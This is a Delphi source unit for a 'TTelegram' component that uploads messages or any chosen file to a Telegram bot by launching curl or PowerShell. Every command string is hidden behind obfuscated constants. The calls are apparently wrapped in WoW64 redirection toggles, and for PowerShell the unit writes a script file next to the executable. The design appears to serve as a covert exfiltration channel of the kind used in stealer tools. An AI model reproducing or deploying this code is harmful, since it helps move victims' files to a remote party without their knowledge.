unit Telegram;

interface

uses GetLibModHandleTelegram, CodeUnitTelegram, System.Classes;

type
  TMethodEx = ( Curl, Powershell );
  TTelegram = class(TComponent)

private
  FMethod: TMethodEx;
  FTokenBot: string;
  FIdAccount: string;
  FText: string;
  FDocument: string;
  procedure SetMethod(Value: TMethodEx);
  function GetMethod: TMethodEx;
  procedure CreateDocument;
  function ExtractFileName(Str:String):String;
  function ExtractFilePath(Str:String):String;
protected
public
  constructor Create(AOwner: TComponent); override;
  destructor Destroy; override;
  procedure SendMessage;
  procedure SendDocument;
published
  property Method: TMethodEx read GetMethod write SetMethod;
  property TokenBot: string read FTokenBot write FTokenBot;
  property Text: string read FText write FText;
  property Document: string read FDocument write FDocument;
  property IdAccount: string read FIdAccount write FIdAccount;

end;

procedure Register;

implementation

constructor TTelegram.Create(AOwner:TComponent);
begin
  inherited Create(AOwner);
end;

destructor TTelegram.Destroy;
begin
  inherited;
end;

function TTelegram.GetMethod: TMethodEx;
begin
  Result := FMethod;
end;

procedure TTelegram.SetMethod(Value: TMethodEx);
begin
  FMethod := Value;
end;

function TTelegram.ExtractFilePath(Str:String):String;
var
  i, j:Integer;
  ostr:String;
  b:Boolean;
begin
  b:=False;
  j := Length(Str);
  for i := j downto 1 do
  begin
    if Str[i] = '\' then b:=True;
    if b = True then ostr := Str[i] + ostr;
  end;
  Result := ostr;
end;

function TTelegram.ExtractFileName(Str:String):String;
var
  i, j:Integer;
  ostr:String;
begin
  j := Length(Str);
  for i := j downto 1 do
    if Str[i] <> '\' then ostr := Str[i] + ostr else Break;
  Result := ostr;
end;

procedure TTelegram.CreateDocument;
var
  F: TextFile;
  FileName: string;
begin
  FileName := ExtractFilePath(ParamStr(0)) + string(HATS(HCOM87));
  AssignFile(F, FileName);
  try
    Rewrite(F);
    Writeln(F,string(HATS(HCOM80))+
    FTokenBot+string(HATS(HCOM81))+
    FIdAccount+string(HATS(HCOM82))+
    FDocument+string(HATS(HCOM83))+
    FText+string(HATS(HCOM84))+
    ExtractFileName(FDocument)+
    string(HATS(HCOM85)));
  finally
    CloseFile(F);
  end;
end;

procedure TTelegram.SendMessage;
var
  WT: LongBool;
begin
  if FMethod = Curl then
  begin
    WoW1(WT);
    SEW($00, '',
      PChar(string(HATS(HCOM1))),
      PChar(string(HATS(HCOM2))+FTokenBot+string(HATS(HCOM33))+
      FIdAccount+string(HATS(HCOM44))+FText+string(HATS(HCOM6))),
    '', $00);
    WoW2(WT);
  end
  else if FMethod = Powershell then
  begin
    WoW1(WT);
    SEW($00, '',
        PChar(string(HATS(HCOM))),
        PChar(string(HATS(HCOM7))+
        FTokenBot+string(HATS(HCOM8))+FIdAccount+string(HATS(HCOM9))+FText+''''),
        '', $00);
    WoW2(WT);
  end;
end;

procedure TTelegram.SendDocument;
var
  WT: LongBool;
begin
  if FMethod = Curl then
  begin
    WoW1(WT);
    SEW($00, '',
      PChar(string(HATS(HCOM1))),
      PChar(string(HATS(HCOM2))+FTokenBot+string(HATS(HCOM3))+
      FIdAccount+string(HATS(HCOM4))+FText+string(HATS(HCOM5))+
      FDocument+string(HATS(HCOM6))),
      '', $00);
    WoW2(WT);
  end
  else if FMethod = Powershell then
  begin
    WoW1(WT);
    CreateDocument;
    SEW($00, '',
        PChar(string(HATS(HCOM1))),
       PChar(string(HATS(HCOM86))+
       ExtractFilePath(ParamStr(0))+
       string(HATS(HCOM87))+'"'
        ),
        '', $00);
    WoW2(WT);
  end;
end;


procedure Register;
begin
  RegisterComponents('ZERO COM', [TTelegram]);
end;

end.